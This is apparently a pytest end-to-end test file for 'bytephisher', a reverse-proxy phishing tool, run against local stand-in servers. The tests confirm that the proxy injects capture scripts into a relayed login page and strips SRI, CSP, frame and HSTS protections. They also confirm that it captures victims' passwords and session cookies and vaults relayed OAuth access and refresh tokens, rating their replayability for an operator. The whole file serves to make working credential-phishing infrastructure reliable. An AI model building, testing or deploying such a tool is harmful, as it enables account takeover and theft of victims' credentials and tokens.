"""End-to-end proof that the reverse proxy works on REAL sockets.

Every other test in the suite injects a fake transport, so a green suite has
never actually proven the tool works the way it is used in the field. This file
stands up a REAL upstream HTTP server (stdlib ``http.server``), starts the tool's
own proxy in-process against it, and drives it as a victim with a real HTTP
client over a real socket - then asserts on the real bytes that come back and on
what actually landed in the capture store.

What is proven here
  * the upstream HTML is rewritten (hook + collector injected, SRI/CSP stripped,
    the upstream origin removed from links and redirects)
  * each victim gets its own upstream cookie jar, so one victim's session never
    leaks into another's
  * a credential POST is captured and the captured session is readable back from
    the store
  * the OAuth callback route is reachable and vaults the grant it receives
  * the captured token set reaches the token tier (token_intel: replayability,
    scopes, tier-0 rungs) through the store's own save path
  * the failures an operator hits are clean: an upstream that is down gives a
    502 page (not a hang), a slow upstream times out instead of hanging forever,
    and a malformed request is rejected without killing the listener

How the proxy is driven
  In-process. ``core.proxy`` is importable, so the test builds a ``Phishlet`` and
  a ``ProxyEngine`` directly and calls ``serve_proxy(engine, port)`` - the same
  objects the ``--proxy`` CLI path builds - rather than shelling out to
  ``bytephisher.py --proxy``. That keeps the test stdlib-only and removes the
  subprocess/readiness flakiness; the engine, handler and store are the real ones.

Run:  ./.venv/bin/python -m pytest tests/test_live_e2e.py -q
"""
import contextlib
import http.cookiejar
import http.server
import json
import os
import socket
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

import pytest
from conftest import free_port

from core import capture as cap
from core import session as session_mod
from core import tokenintel
from core.oauth import OauthSpec
from core.phishlet import AuthToken
from core.proxy import CAPTURE_PATH, HOOK_PATH, Phishlet, ProxyEngine, serve_proxy

# local sockets, temp databases - never the internet
pytestmark = pytest.mark.integration

# the header the upstream requires and the proxy must forward
FORWARDED_HEADER = "X-Client-Token"
FORWARDED_VALUE = "tok-123"


# --------------------------------------------------------------- defect gate --
def _add_oauth_reaches_tokens():
    """Probe the store: does session.add_oauth() mirror into rec["tokens"]?

    Every consumer of a captured token (tokenintel, tier0, dbsc, the CLI) reads
    rec["tokens"]. A grant that lands only in rec["oauth"] is invisible to the
    token tier. This returns True once add_oauth mirrors the fields across.
    """
    rec = session_mod.new_record("defect-probe")
    session_mod.add_oauth(rec, {"access_token": "probe", "refresh_token": "probe"},
                          provider="probe", source="oauth")
    return bool((rec.get("tokens") or {}).get("access_token"))


def _require_oauth_tokens_fix():
    """xfail (do not weaken) when the add_oauth -> tokens defect is still live."""
    if not _add_oauth_reaches_tokens():
        pytest.xfail(
            "defect: session.add_oauth() stores an OAuth-relay / device-code grant "
            "in rec['oauth'] only, so rec['tokens'] stays empty and tokenintel, "
            "tier0, dbsc, the chain pre-flight and the CLI (--tier0 / --replayability "
            "/ --token-keepalive / --federation-set) cannot see the captured tokens - "
            "the tier reports 'no token to judge'. Fix not landed yet; assertion left "
            "unweakened on purpose.")


# ------------------------------------------------------------------- helpers --
def _set_cookies(headers):
    """Every Set-Cookie value on a urllib response (dict() would collapse them)."""
    return headers.get_all("Set-Cookie") or []


def _cookie_value(jar, name):
    for c in jar:
        if c.name == name:
            return c.value
    return None


def _open(opener, req, timeout=10):
    """Open a request; a 4xx/5xx is a result to assert on, not an exception."""
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.headers, e.read()


def _get(opener, url, headers=None, timeout=10):
    req = urllib.request.Request(url, headers=headers or {})
    return _open(opener, req, timeout=timeout)


def _post(opener, url, data, headers=None, timeout=10):
    body = urllib.parse.urlencode(data).encode()
    h = {"Content-Type": "application/x-www-form-urlencoded"}
    h.update(headers or {})
    req = urllib.request.Request(url, data=body, headers=h)
    return _open(opener, req, timeout=timeout)


def _post_json(opener, url, obj, timeout=10):
    body = json.dumps(obj).encode()
    req = urllib.request.Request(url, data=body,
                                 headers={"Content-Type": "application/json"})
    return _open(opener, req, timeout=timeout)


def _no_redirect_opener(jar):
    """An opener that surfaces a 3xx itself instead of following it."""
    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar),
                                       _NoRedirect)


def _victim(jar=None):
    """A victim: its own cookie jar, so sessions stay separate."""
    jar = jar if jar is not None else http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    opener.jar = jar
    return opener


def _wait_for(fn, timeout=4.0, interval=0.05):
    """Poll a getter until it returns something truthy (the server writes async)."""
    deadline = time.time() + timeout
    val = fn()
    while not val and time.time() < deadline:
        time.sleep(interval)
        val = fn()
    return val


def _raw_request(port, payload, timeout=5.0):
    """Send raw bytes to the victim leg and read the response head."""
    s = socket.create_connection(("127.0.0.1", port), timeout=timeout)
    try:
        s.sendall(payload)
        s.settimeout(timeout)
        data = b""
        while b"\r\n\r\n" not in data:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
        return data
    finally:
        s.close()


def _status_line(raw):
    return raw.split(b"\r\n", 1)[0].decode("latin-1", "replace")


# --------------------------------------------------------------------- rig ----
class Rig:
    """A real upstream site + the tool's proxy, wired over real sockets.

    ``upstream=False`` models an upstream that is down (nothing listening).
    ``slow=True`` models an upstream that stalls before answering.
    ``oauth=True`` adds a fake provider token endpoint so the callback route can
    complete a real authorization-code exchange.
    """

    def __init__(self, *, upstream=True, slow=False, oauth=False, timeout=5.0,
                 slow_seconds=5.0):
        self.slow = slow
        self.slow_seconds = slow_seconds
        self.timeout = timeout
        self.requests = []                 # every request the upstream received
        self.token_requests = []           # every body the token endpoint received
        self._up = self._up_thread = None
        self._tok = self._tok_thread = None
        self._stopped = False

        self.upstream_port = free_port()
        if upstream:
            self._start_upstream()

        self.token_port = None
        spec = None
        if oauth:
            self._start_token_endpoint()
            spec = OauthSpec(provider="custom", client_id="cid-1",
                             issuer=f"http://127.0.0.1:{self.token_port}",
                             token_path="/token",
                             scope="openid offline_access Mail.Read")

        # the same objects the --proxy CLI path builds (bytephisher.py, inline_phishlet)
        self.phishlet = Phishlet(
            name="acme", upstream=f"127.0.0.1:{self.upstream_port}", scheme="http",
            timeout=timeout,
            auth_tokens=[AuthToken(keys=[".*:regexp"], domain="")],
            oauth=spec)
        self.db_path = os.path.join(tempfile.mkdtemp(prefix="bp_live_e2e_"), "c.db")
        self.db = cap.CaptureDB(self.db_path)
        # impersonate="" -> the plain `requests` transport, so the test does not
        # depend on curl_cffi being installed
        self.engine = ProxyEngine(self.phishlet, db=self.db, on_capture=None,
                                  geo_provider="off", impersonate="",
                                  server_header="nginx")
        self.port = free_port()
        self.httpd = serve_proxy(self.engine, self.port, campaign="live-e2e")
        self._proxy_thread = threading.Thread(target=self.httpd.serve_forever,
                                              daemon=True)
        self._proxy_thread.start()
        self._wait_ready()

    # ---- upstream ----
    def _start_upstream(self):
        rig = self

        class Upstream(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):
                pass

            def _origin(self):
                return "http://" + (self.headers.get("Host") or "127.0.0.1")

            def _record(self, body=b""):
                rig.requests.append({"method": self.command, "path": self.path,
                                     "headers": dict(self.headers.items()),
                                     "body": body})

            def _send(self, code, body=b"", ctype="text/html; charset=utf-8",
                      extra=None):
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                for k, v in (extra or []):
                    self.send_header(k, v)
                self.end_headers()
                if self.command != "HEAD":
                    self.wfile.write(body)

            def do_GET(self):
                self._record()
                path = self.path.split("?")[0]
                if path == "/slow":
                    time.sleep(rig.slow_seconds)
                    self._send(200, b"<html><body>late</body></html>")
                    return
                if path == "/":
                    origin = self._origin()
                    html = (
                        "<html><head><title>Acme Login</title>"
                        f'<script src="{origin}/static/app.js" integrity="sha384-fake"'
                        ' crossorigin="anonymous"></script></head><body>'
                        f'<form method="POST" action="{origin}/login">'
                        "<input name='username'><input name='password' type='password'>"
                        "</form>"
                        f'<a href="{origin}/dashboard">Dashboard</a>'
                        "</body></html>").encode()
                    self._send(200, html, extra=[
                        ("Content-Security-Policy", "default-src 'self'"),
                        ("X-Frame-Options", "DENY"),
                        ("Strict-Transport-Security", "max-age=31536000")])
                    return
                if path == "/app":
                    if "up_session=" in (self.headers.get("Cookie") or ""):
                        self._send(200, b"<html><body>WELCOME-SECRET</body></html>")
                    else:
                        self._send(302, b"", extra=[("Location", "/")])
                    return
                if path == "/api/profile":
                    if self.headers.get(FORWARDED_HEADER) == FORWARDED_VALUE:
                        self._send(200, b'{"ok":true,"who":"victim"}',
                                   ctype="application/json")
                    else:
                        self._send(401, b'{"error":"header required"}',
                                   ctype="application/json")
                    return
                self._send(404, b"<html><body>not found</body></html>")

            def do_POST(self):
                n = int(self.headers.get("Content-Length") or 0)
                body = self.rfile.read(n) if n else b""
                self._record(body)
                if self.path.split("?")[0] == "/login":
                    self._send(302, b"", extra=[
                        ("Set-Cookie",
                         "up_session=ABC123; Path=/; HttpOnly; Domain=127.0.0.1"),
                        ("Location", f"{self._origin()}/app")])
                    return
                self._send(404, b"<html><body>not found</body></html>")

        self._up = http.server.ThreadingHTTPServer(("127.0.0.1", self.upstream_port),
                                                   Upstream)
        self._up_thread = threading.Thread(target=self._up.serve_forever, daemon=True)
        self._up_thread.start()

    # ---- fake provider token endpoint ----
    def _start_token_endpoint(self):
        rig = self
        self.token_port = free_port()

        class TokenEndpoint(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *a):
                pass

            def do_POST(self):
                n = int(self.headers.get("Content-Length") or 0)
                rig.token_requests.append(self.rfile.read(n).decode("utf-8", "replace"))
                out = json.dumps({
                    "access_token": "AT-xyz", "refresh_token": "RT-xyz",
                    "token_type": "Bearer",
                    "scope": "openid offline_access Mail.Read",
                    "expires_in": 3600}).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(out)))
                self.end_headers()
                self.wfile.write(out)

        self._tok = http.server.ThreadingHTTPServer(("127.0.0.1", self.token_port),
                                                    TokenEndpoint)
        self._tok_thread = threading.Thread(target=self._tok.serve_forever, daemon=True)
        self._tok_thread.start()

    def _wait_ready(self):
        for _ in range(200):
            try:
                with socket.create_connection(("127.0.0.1", self.port), timeout=1):
                    return
            except OSError:
                time.sleep(0.02)
        raise AssertionError("proxy did not start listening")

    # ---- assertions about upstream traffic ----
    def saw(self, method, path):
        return any(r["method"] == method and r["path"].split("?")[0] == path
                   for r in self.requests)

    def upstream_post_body(self, path):
        for r in self.requests:
            if r["method"] == "POST" and r["path"].split("?")[0] == path:
                return r["body"].decode("utf-8", "replace")
        return None

    def victim(self):
        return _victim()

    def base(self):
        return f"http://127.0.0.1:{self.port}"

    # ---- teardown ----
    def stop(self):
        if self._stopped:
            return
        self._stopped = True
        for srv in (self.httpd, self._up, self._tok):
            if srv is not None:
                with contextlib.suppress(Exception):
                    srv.shutdown()
                with contextlib.suppress(Exception):
                    srv.server_close()
        for th in (self._proxy_thread, self._up_thread, self._tok_thread):
            if th is not None:
                th.join(timeout=5)
        with contextlib.suppress(Exception):
            self.db.close()

    def assert_clean(self):
        """The rig must not leave a port bound or a thread running."""
        assert not self._proxy_thread.is_alive(), "proxy thread still running after stop()"
        for th, label in ((self._up_thread, "upstream"), (self._tok_thread, "token")):
            if th is not None:
                assert not th.is_alive(), f"{label} thread still running after stop()"
        # nothing may still be listening on the victim port
        probe = socket.socket()
        try:
            probe.bind(("127.0.0.1", self.port))
        finally:
            probe.close()


@pytest.fixture
def make_rig():
    """Build rigs on demand; every one is stopped when the test ends."""
    rigs = []

    def _make(**kw):
        rig = Rig(**kw)
        rigs.append(rig)
        return rig

    yield _make
    for rig in rigs:
        rig.stop()


# ============================================================ HTML rewrite ====
def test_upstream_html_is_rewritten_over_a_real_socket(make_rig):
    rig = make_rig()
    victim = rig.victim()

    status, headers, body = _get(victim, rig.base() + "/")
    text = body.decode("utf-8", "replace")

    # it really is the upstream's page, served over the real socket
    assert status == 200
    assert rig.saw("GET", "/"), "the proxy never asked the upstream for /"
    assert "Acme Login" in text, "upstream markup did not survive the hop"

    # the capture hook and the deep-intel collector are injected
    assert rig.engine.path_of(HOOK_PATH) in text, "hook script was not injected"
    assert "/__bh/intel.js" in text, "intel collector was not injected"

    # SRI + policy attributes that break once we inject are gone
    assert "integrity=" not in text, "SRI integrity attribute survived"
    assert "crossorigin=" not in text, "crossorigin attribute survived"

    # every absolute link/form back to the upstream origin is rewritten away
    origin = f"http://127.0.0.1:{rig.upstream_port}"
    assert origin not in text, "upstream origin leaked into the rewritten page"

    # response headers that would leak or break the trick are stripped
    assert headers.get("Content-Security-Policy") is None, "CSP survived"
    assert headers.get("X-Frame-Options") is None, "X-Frame-Options survived"
    assert headers.get("Strict-Transport-Security") is None, "HSTS survived"
    assert (headers.get("Content-Type") or "").startswith("text/html")

    # our own HttpOnly session cookie rides alongside the page
    cookies = _set_cookies(headers)
    name = rig.engine.symbols.session
    assert any(c.startswith(name + "=") for c in cookies), cookies
    assert all("HttpOnly" in c for c in cookies if c.startswith(name + "="))


# ======================================================= per-victim jars =====
def test_each_victim_gets_an_isolated_upstream_cookie_jar(make_rig):
    rig = make_rig()
    alice = rig.victim()
    bob = rig.victim()

    # alice logs in -> the upstream sets up_session in HER server-side jar
    status, _headers, _body = _post(_no_redirect_opener(alice.jar), rig.base() + "/login",
                                    {"username": "alice", "password": "pw-alice"})
    assert status == 302
    assert _cookie_value(alice.jar, "up_session") == "ABC123"
    assert _cookie_value(alice.jar, rig.engine.symbols.session) is not None

    # alice's authenticated page is served
    status, _h, body = _get(alice, rig.base() + "/app")
    assert status == 200 and "WELCOME-SECRET" in body.decode()

    # bob never logged in: the upstream sees no up_session and bounces him
    assert _cookie_value(bob.jar, "up_session") is None
    status, _h, body = _get(_no_redirect_opener(bob.jar), rig.base() + "/app")
    assert status == 302, "a fresh victim reached the authenticated page"
    assert "WELCOME-SECRET" not in body.decode()

    # the two victims are different sessions on the proxy side too
    alice_sid = _cookie_value(alice.jar, rig.engine.symbols.session)
    bob_sid = _cookie_value(bob.jar, rig.engine.symbols.session)
    assert alice_sid and bob_sid and alice_sid != bob_sid


# ===================================================== credential capture =====
def test_proxied_credential_post_is_captured_into_the_session_vault(make_rig):
    rig = make_rig()
    alice = rig.victim()

    status, headers, _body = _post(_no_redirect_opener(alice.jar),
                                   rig.base() + "/login",
                                   {"username": "alice", "password": "S3cret!"})
    assert status == 302
    sid = _cookie_value(alice.jar, rig.engine.symbols.session)
    assert sid, "no proxy session cookie was issued"

    # the credential POST was relayed to the real upstream (not swallowed locally)
    relayed = rig.upstream_post_body("/login")
    assert relayed is not None and "username=alice" in relayed, relayed

    # ...and captured into the store, readable back by session id.
    # The vault is written twice: once with the credentials when the relayed form
    # post is seen, and again with the cookie jar when the upstream's Set-Cookie
    # lands. Waiting only for the record raced the second write (a loaded CI runner
    # polled between the two), so wait for the state the assertions below are about.
    def _vaulted_with_the_session_cookie():
        record = rig.db.session_get(sid)
        if record and any(c.get("name") == "up_session"
                          for c in record.get("cookies") or []):
            return record
        return None

    rec = _wait_for(_vaulted_with_the_session_cookie)
    assert rec is not None, "the upstream session cookie was never vaulted"
    assert rec["credentials"].get("username") == "alice"
    assert rec["credentials"].get("password") == "S3cret!"
    assert rec["state"] in ("creds", "session", "takeover", "done"), rec["state"]

    # the tier is computed wherever a token lands, even for a cookie-only session
    assert rec.get("token_intel"), "session with tokens has no token_intel"

    # Domain= was neutralised so the captured cookie is usable on our host
    forwarded = [c for c in _set_cookies(headers) if c.startswith("up_session=")]
    assert forwarded and all("Domain=" not in c for c in forwarded), forwarded


def test_hook_capture_endpoint_persists_a_capture_and_vault_row(make_rig):
    """The JS hook's own capture path (what a real browser uses) writes the store."""
    rig = make_rig()
    victim = rig.victim()

    payload = {
        "fields": {"username": "bob", "password": "pw-bob"},
        "fingerprint": {"canvas_hash": "abc123", "ua": "probe"},
        "cookies": {"up_session": "XYZ"},
        "events": [{"type": "input", "target": "password"}],
    }
    status, _headers, body = _post_json(victim, rig.base() + rig.engine.path_of(CAPTURE_PATH),
                                        payload)
    assert status == 200, body
    result = json.loads(body.decode())
    assert result.get("ok") is True and result.get("cred") is True
    sid = result.get("session")
    assert sid

    # wait for the state the assertion is about: the vault is written more than once
    def _bob_vaulted():
        record = rig.db.session_get(sid)
        return record if record and record["credentials"].get("username") == "bob" else None

    rec = _wait_for(_bob_vaulted)
    assert rec is not None, "bob's credentials were never vaulted"

    # a real capture row (the operator's captures table) is written too
    rows = _wait_for(lambda: rig.db.all())
    assert rows and rows[0]["fields"].get("username") == "bob"
    assert rows[0]["is_cred"] is True


# ================================================== header forwarding =========
def test_forwarded_request_header_reaches_the_upstream(make_rig):
    rig = make_rig()
    victim = rig.victim()

    # with the header the upstream requires, the request is accepted
    status, _h, body = _get(victim, rig.base() + "/api/profile",
                            headers={FORWARDED_HEADER: FORWARDED_VALUE,
                                     "Accept": "application/json"})
    assert status == 200, body
    assert json.loads(body.decode()).get("who") == "victim"

    # without it, the upstream refuses - proving the header (not something else)
    # is what made the difference, i.e. the proxy forwarded it verbatim
    status, _h, body = _get(victim, rig.base() + "/api/profile",
                            headers={"Accept": "application/json"})
    assert status == 401, body


# ==================================================== OAuth callback route ====
def test_oauth_callback_route_is_reachable_and_vaults_the_grant(make_rig):
    rig = make_rig(oauth=True)
    assert rig.engine.oauth_ready() is not None

    sess = rig.engine.session(ip="127.0.0.1", ua="probe")
    sid = sess.sid
    authorize = rig.engine.oauth_start(sess)
    assert f"127.0.0.1:{rig.token_port}" in authorize, authorize
    assert "code_challenge=" in authorize and "response_type=code" in authorize

    flow = rig.engine.oauth_manager.get(sid)
    assert flow is not None

    # the provider redirects the victim's browser back to our callback
    victim = rig.victim()
    cb = (rig.base() + "/__bh/oauth/cb?code=CODE-1&state="
          + urllib.parse.quote(flow.state))
    req = urllib.request.Request(cb, headers={"Cookie": f"{rig.engine.symbols.session}={sid}",
                                              "Accept": "text/html"})
    status, headers, _body = _open(_no_redirect_opener(victim.jar), req)
    assert status == 302, f"callback did not complete the flow (status {status})"
    assert rig.token_requests, "the code was never exchanged with the token endpoint"
    assert "grant_type=authorization_code" in rig.token_requests[0]

    def _tokens_vaulted():
        record = rig.db.session_get(sid)
        return record if record and record["oauth"].get("access_token") == "AT-xyz" else None

    rec = _wait_for(_tokens_vaulted)
    assert rec is not None, "the oauth token set was never vaulted"
    assert rec["oauth"].get("refresh_token") == "RT-xyz"

    # the token set must be visible to the tier (defect-gated, not weakened)
    _require_oauth_tokens_fix()
    assert rec["tokens"].get("access_token") == "AT-xyz"
    assert rec["tokens"].get("refresh_token") == "RT-xyz"
    intel = rec.get("token_intel") or {}
    assert intel.get("replayability"), "no replayability verdict for a captured grant"
    assert intel.get("tier0"), "no tier-0 verdicts for a captured grant"


# ============================================ capture -> token_intel -> tier ==
@pytest.mark.parametrize("source", ["oauth", "devicecode"])
def test_oauth_grant_is_visible_to_the_token_tier(source):
    """Pin the interconnection the tool advertises.

    A grant that arrives through session.add_oauth() (the OAuth relay and the
    device-code route) must reach rec["tokens"], so the store's save path annotates
    it with a token_intel verdict. xfail (not a weakened assertion) while the
    add_oauth -> tokens defect is unfixed.
    """
    db = cap.CaptureDB(os.path.join(tempfile.mkdtemp(prefix="bp_tier_"), "t.db"))
    try:
        rec = session_mod.new_record("oauth-tier-1", phishlet="acme")
        session_mod.add_oauth(
            rec,
            {"access_token": "AT", "refresh_token": "RT", "token_type": "Bearer",
             "scope": "openid offline_access Mail.Read", "expires_in": 3600},
            provider="microsoft", client_id="cid-1",
            scopes=["openid", "offline_access", "Mail.Read"], source=source)

        _require_oauth_tokens_fix()

        # one shape, one place: the token tier reads rec["tokens"]
        assert rec["tokens"].get("access_token") == "AT"
        assert rec["tokens"].get("refresh_token") == "RT"

        # the store's own save path annotates where the token lands
        db.session_save(rec)
        stored = db.session_get("oauth-tier-1")
        assert stored is not None
        intel = stored.get("token_intel") or {}
        assert intel, "a session carrying tokens got no token_intel block"
        assert intel.get("replayability") in (
            "replayable", "fragile", "not_replayable", "unknown"), intel
        assert intel.get("tier0"), "no tier-0 rungs computed for the grant"
        assert "Mail.Read" in (intel.get("scopes") or []), intel.get("scopes")
        assert "access_token" in (intel.get("tokens") or [])

        # the operator-facing renderers agree
        assert tokenintel.summary(stored).startswith("token tier:")
        assert tokenintel.line(stored)
    finally:
        db.close()


# ============================================================ failure modes ===
def test_upstream_down_returns_a_clean_502_not_a_hang(make_rig):
    # upstream=False: nothing is listening on the upstream port
    rig = make_rig(upstream=False)
    victim = rig.victim()

    started = time.time()
    status, headers, body = _get(victim, rig.base() + "/", timeout=8)
    elapsed = time.time() - started

    assert status == 502, f"down upstream gave {status}, not a 502 page"
    assert "Bad gateway" in body.decode("utf-8", "replace")
    assert (headers.get("Content-Type") or "").startswith("text/html")
    assert elapsed < 5.0, f"a down upstream took {elapsed:.1f}s - it should fail fast"


def test_slow_upstream_times_out_instead_of_hanging(make_rig):
    rig = make_rig(slow=True, timeout=1.0, slow_seconds=5.0)
    victim = rig.victim()

    started = time.time()
    status, _headers, body = _get(victim, rig.base() + "/slow", timeout=10)
    elapsed = time.time() - started

    assert status == 502, f"a stalling upstream gave {status}, not a 502 page"
    assert "Bad gateway" in body.decode("utf-8", "replace")
    # bounded by the phishlet timeout (1s) plus slack, never the 5s stall
    assert elapsed < 4.0, f"a slow upstream hung for {elapsed:.1f}s"


def test_malformed_request_is_rejected_and_the_listener_survives(make_rig):
    rig = make_rig()
    port = rig.port

    dup = _raw_request(port, b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: 3\r\n"
                             b"Content-Length: 3\r\n\r\nabc")
    assert "400" in _status_line(dup), _status_line(dup)

    neg = _raw_request(port, b"POST / HTTP/1.1\r\nHost: x\r\nContent-Length: -5\r\n\r\n")
    assert "400" in _status_line(neg), _status_line(neg)

    bad_te = _raw_request(port, b"POST / HTTP/1.1\r\nHost: x\r\n"
                                b"Transfer-Encoding: gzip\r\n\r\n")
    assert "501" in _status_line(bad_te), _status_line(bad_te)

    garbage = _raw_request(port, b"THIS IS NOT A REQUEST LINE\r\n\r\n")
    assert "400" in _status_line(garbage), _status_line(garbage)

    # the listener and its worker threads are still healthy afterwards
    victim = rig.victim()
    status, _h, body = _get(victim, rig.base() + "/")
    assert status == 200 and "Acme Login" in body.decode()


def test_rig_cleanup_releases_the_port_and_the_thread(make_rig):
    rig = make_rig()
    rig.stop()
    rig.assert_clean()
    # stop() is idempotent, so fixture teardown is harmless
    rig.stop()
    rig.assert_clean()
